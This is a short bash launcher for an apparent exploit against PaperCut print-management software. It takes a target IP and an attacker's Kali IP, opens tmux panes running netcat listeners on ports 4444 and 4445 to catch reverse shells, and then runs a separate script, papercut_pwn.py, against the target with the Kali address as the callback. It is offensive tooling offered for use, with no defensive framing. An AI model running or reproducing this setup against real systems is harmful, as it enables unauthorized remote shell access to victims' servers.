#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <TARGET_IP> <KALI_IP>"
    exit 1
fi

TARGET=$1
KALI=$2
SESSION="papercut_pwn"

tmux kill-session -t $SESSION 2>/dev/null
tmux new-session -d -s $SESSION -n "Exploit"

tmux split-window -v -t $SESSION
tmux split-window -h -t $SESSION.1

tmux send-keys -t $SESSION.1 "nc -lvnp 4444" C-m
tmux send-keys -t $SESSION.2 "nc -lvnp 4445" C-m

echo "[*] Initializing environment..."
sleep 2

tmux send-keys -t $SESSION.0 "python3 papercut_pwn.py -t $TARGET -k $KALI" C-m

echo "[+] Attaching to tmux session..."
tmux attach-session -t $SESSION